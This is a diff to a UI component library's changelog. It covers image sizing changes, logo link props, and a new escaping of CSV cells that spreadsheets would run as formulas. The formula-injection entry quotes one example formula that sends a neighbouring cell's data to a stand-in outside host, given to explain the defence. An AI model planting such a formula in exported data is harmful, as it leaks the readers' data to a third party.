@@ -6,9 +6,13 @@
 
 - **A lone `width` or `height` on `MPImage` sizes the box.** The two together are still the file's size and still reserve its proportion. One of them alone used to reach the `<img>` and change nothing, because the picture always filled its box. Now `height` alone makes the box that tall and as wide as its container, or as wide as `ratio` makes it, and `width` alone makes the box that wide, no wider than its container. Code that passed one dimension as a hint about the file now draws at that size: pass both dimensions, or remove the one.
 
+- **`MPDataTable`'s CSV defuses a cell a spreadsheet would run as a formula.** A cell beginning `=`, `+`, `-` or `@` is a formula to Excel, Sheets and LibreOffice, and the rows in a data table are usually things other people typed — so `=HYPERLINK("https://collect.example/?r="&A1)` in a name column was one click from posting the row beside it to somebody else's server, on the reader's own machine and out of this component's reach. Such a cell now goes out with an apostrophe in front, which all three read as "the rest of this is text" and strip on the way in. A number keeps its sign: `-5` and `+82 2 555 0100` begin with a formula character and are not formulas. A file bound for a parser rather than for a person needs `exportEscapeFormulas={false}` — a database loader has no apostrophe rule and takes the character as part of the value.
+
 - **An `MPImage` with `preview` fills its container, as one without it does.** The button `preview` draws was as wide as the picture inside it, so a file narrower than its container drew at its own width once it could be opened, and at the container's width when it could not. Both are the container's width now. To keep a small picture at its own size, give it a lone `width`, such as the file's width in pixels: the box is then that wide and no wider than its container, which is what the button used to do.
 
 ### Added
+
+- **`MPDataTable` takes `exportEscapeFormulas`.** It turns off the formula escaping described above, for the one case where that escaping is wrong: a file going to a parser rather than to a person. @default `true`
 
 - **`MPAppLogo` takes `target` and `rel`.** Both already reached the `<a>` an `href` makes, as part of the element's own prop set, and neither was documented or wired to anything. They are named props now and `target="_blank"` gets a `rel` on its own, which is the fix below.
 
